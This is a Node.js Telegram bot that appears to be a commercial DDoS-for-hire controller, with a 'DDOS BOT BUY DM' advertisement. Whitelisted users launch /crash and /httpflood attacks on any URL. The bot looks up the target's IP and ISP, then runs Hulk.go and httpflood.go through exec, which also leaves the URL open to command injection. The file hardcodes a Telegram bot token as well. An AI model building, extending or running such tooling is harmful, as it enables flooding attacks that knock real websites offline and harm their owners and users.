const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const dns = require('dns');
const axios = require('axios');

const TOKEN = '8210312518:AAHPmPlnBL5DUr-8MLbv6bj8kETjmiFisVQ';
const bot = new TelegramBot(TOKEN, { polling: true });

const owners = [5385272366];
const whitelist = [5385272366];
const attackLogs = [];
const cooldown = new Map();
const activeAttacks = new Map();

function isCooldown(id) {
  const now = Date.now();
  if (!cooldown.has(id)) {
    cooldown.set(id, now);
    return false;
  }
  if (now - cooldown.get(id) >= 60000) {
    cooldown.set(id, now);
    return false;
  }
  return true;
}

function isAllowed(id) {
  return whitelist.includes(id);
}

function getHost(url) {
  return url.replace(/^https?:\/\//, '').split('/')[0];
}

async function resolveUrlInfo(url) {
  return new Promise((resolve, reject) => {
    const hostname = getHost(url);
    console.log("Hostname:", hostname);
    dns.lookup(hostname, async (err, address) => {
      if (err) {
        console.error('DNS Lookup Error:', err);
        return reject('❌ DNS Lookup Failed');
      }
      console.log("Resolved IP:", address);

      try {
        const res = await axios.get(`http://ip-api.com/json/${address}`);
        console.log("IP API Response:", res.data);
        resolve({
          ip: address,
          isp: res.data.isp || "Unknown ISP",
          country: res.data.country || "Unknown"
        });
      } catch (e) {
        console.error('Axios Error:', e.message);
        resolve({
          ip: address,
          isp: "Unknown ISP",
          country: "Unknown"
        });
      }
    });
  });
}

function formatAttackMessage(url, method, duration, isp, ip) {
  return `╔══════════════════════╗
║     ATTACK LAUNCHED     ║
╚══════════════════════╝

🎯 Target: ${url}
⚙️ Method: ${method}
⏳ Duration: ${duration}s
🏢 ISP: ${isp}
📡 IP: ${ip}
🕒 Started: ${new Date().toLocaleTimeString()}

🤖 Powered by Cnc Team
👑 Owner: @Cnc_Saiwana1`;
}

bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;

  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Copy User ID", callback_data: `copy_${userId}` }
        ]
      ]
    }
  };

  bot.sendMessage(msg.chat.id, `Your USER ID is:\n${userId}\n\nDDOS BOT BUY DM :- @Cnc_Saiwana1`, opts);
});

// Handle button press
bot.on('callback_query', query => {
  const data = query.data;
  const chatId = query.message.chat.id;

  if (data.startsWith('copy_')) {
    const userId = data.split('_')[1];
    // Send user ID again so user can easily copy it
    bot.sendMessage(chatId, `📋 Your USER ID is:\n${userId}`);
    bot.answerCallbackQuery(query.id, { text: 'User ID shown below, you can copy it now.' });
  }
});




bot.onText(/\/help/, (msg) => {
const id = msg.from.id;
  if (!isAllowed(id)) return bot.sendMessage(msg.chat.id, '❌ You are not allowed.');
  bot.sendMessage(msg.chat.id, `💻 CNC Bot Menu\n\n⚔️Commands:\n/crash <url> <GET|POST> <duration>\n/httpflood <url> <threads> <GET|POST> <duration>\n/stop\n\n🛠️Admin:\n/adduser <id>\n/removeuser <id>\n/info\n/attacklogs\n\n🤖 Powered by Cnc Team\n👑 Owner: @Cnc_Saiwana1`);
});




function attackKey(chatId, messageId) {
  return `${chatId}_${messageId}`;
}

bot.onText(/\/crash (.+) (GET|POST) (\d+)/i, async (msg, match) => {
  const id = msg.from.id;
  if (!isAllowed(id)) return bot.sendMessage(msg.chat.id, '❌ Access Denied');
  if (!owners.includes(id) && isCooldown(id)) return bot.sendMessage(msg.chat.id, `⏱ Please wait 60s`);

  const [, url, method, durationStr] = match;
  let sec = parseInt(durationStr);

  let ip = "Resolving...";
  let isp = "Looking up...";

  try {
    const info = await resolveUrlInfo(url);
    ip = info.ip;
    isp = info.isp;
  } catch {
    ip = "Unknown";
    isp = "Unknown";
  }

  const opts = {
    reply_markup: {
      inline_keyboard: [[
        { text: '🛑 Stop Attack', callback_data: `stop_${msg.chat.id}_${msg.message_id}` }
      ]]
    }
  };

  const sent = await bot.sendMessage(msg.chat.id, formatAttackMessage(url, 'crash', sec, isp, ip), opts);

  const key = attackKey(sent.chat.id, sent.message_id);

  const interval = setInterval(() => {
    sec--;
    if (sec > 0) {
      bot.editMessageText(formatAttackMessage(url, 'crash', sec, isp, ip), {
        chat_id: sent.chat.id,
        message_id: sent.message_id,
        reply_markup: opts.reply_markup
      }).catch(() => { });
    } else {
      clearInterval(interval);
      if (activeAttacks.has(key)) {
        activeAttacks.get(key).kill('SIGTERM');
        activeAttacks.delete(key);
      }
      bot.deleteMessage(sent.chat.id, sent.message_id).catch(() => { });
      bot.sendMessage(sent.chat.id, `✅ Attack to ${url} finished.`);
    }
  }, 1000);

  const cmd = `timeout ${durationStr}s go run Hulk.go -site ${url} -data ${method}`;
  const child = exec(cmd, () => { });
  activeAttacks.set(key, child);
});

bot.onText(/\/httpflood (.+) (\d+) (GET|POST) (\d+)/i, async (msg, match) => {
  const id = msg.from.id;
  if (!isAllowed(id)) return bot.sendMessage(msg.chat.id, '❌ Access Denied');
  if (!owners.includes(id) && isCooldown(id)) return bot.sendMessage(msg.chat.id, `⏱ Please wait 60s`);

  const [, url, threads, method, durationStr] = match;
  let sec = parseInt(durationStr);

  let ip = "Resolving...";
  let isp = "Looking up...";

  try {
    const info = await resolveUrlInfo(url);
    ip = info.ip;
    isp = info.isp;
  } catch {
    ip = "Unknown";
    isp = "Unknown";
  }

  const opts = {
    reply_markup: {
      inline_keyboard: [[
        { text: '🛑 Stop Attack', callback_data: `stop_${msg.chat.id}_${msg.message_id}` }
      ]]
    }
  };

  const sent = await bot.sendMessage(msg.chat.id, formatAttackMessage(url, 'httpflood', sec, isp, ip), opts);

  const key = attackKey(sent.chat.id, sent.message_id);

  const interval = setInterval(() => {
    sec--;
    if (sec > 0) {
      bot.editMessageText(formatAttackMessage(url, 'httpflood', sec, isp, ip), {
        chat_id: sent.chat.id,
        message_id: sent.message_id,
        reply_markup: opts.reply_markup
      }).catch(() => { });
    } else {
      clearInterval(interval);
      if (activeAttacks.has(key)) {
        activeAttacks.get(key).kill('SIGTERM');
        activeAttacks.delete(key);
      }
      bot.deleteMessage(sent.chat.id, sent.message_id).catch(() => { });
      bot.sendMessage(sent.chat.id, `✅ Attack to ${url} finished.`);
    }
  }, 1000);

  const cmd = `timeout ${durationStr}s go run httpflood.go ${url} ${threads} ${method} ${durationStr} nil`;
  const child = exec(cmd, () => { });
  activeAttacks.set(key, child);
});

bot.on('callback_query', query => {
  const data = query.data;
  const msg = query.message;

  if (data.startsWith('stop_')) {
    const parts = data.split('_'); // stop_chatId_messageId
    if (parts.length !== 3) {
      bot.answerCallbackQuery(query.id, { text: '❗ Invalid stop command.', show_alert: true });
      return;
    }

    const chatId = Number(parts[1]);
    const messageId = Number(parts[2]);
    const key = attackKey(chatId, messageId);

    if (activeAttacks.has(key)) {
      activeAttacks.get(key).kill('SIGTERM');
      activeAttacks.delete(key);

      bot.editMessageText('❌ Attack stopped by user.', {
        chat_id: chatId,
        message_id: messageId
      }).catch(() => { });

      bot.answerCallbackQuery(query.id, { text: 'Attack stopped.', show_alert: false });
    } else {
      bot.answerCallbackQuery(query.id, { text: '❗ No active attack found.', show_alert: true });
    }
  }
});

bot.onText(/\/adduser (\d+)/, (msg, match) => {
  const id = msg.from.id;
  if (!owners.includes(id)) return;
  const newId = parseInt(match[1]);
  if (!whitelist.includes(newId)) {
    whitelist.push(newId);
    bot.sendMessage(msg.chat.id, `✅ ${newId} added`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ Already whitelisted`);
  }
});

bot.onText(/\/removeuser (\d+)/, (msg, match) => {
  const id = msg.from.id;
  if (!owners.includes(id)) return;
  const rm = parseInt(match[1]);
  const idx = whitelist.indexOf(rm);
  if (idx >= 0) {
    whitelist.splice(idx, 1);
    bot.sendMessage(msg.chat.id, `❌ ${rm} removed`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ Not in list`);
  }
});

bot.onText(/\/info/, (msg) => {
  const id = msg.from.id;
  if (!isAllowed(id)) return;
  bot.sendMessage(msg.chat.id, `🧠 Info\nWhitelist: ${whitelist.join(', ')}`);
});

bot.onText(/\/attacklogs/, (msg) => {
  if (!owners.includes(msg.from.id)) return;
  if (attackLogs.length === 0) return bot.sendMessage(msg.chat.id, "📭 No logs yet.");
  const logs = attackLogs.map(log => `🔹 ${log}`).join("\n\n");
  bot.sendMessage(msg.chat.id, `📄 Attack Logs:\n\n${logs}`);
});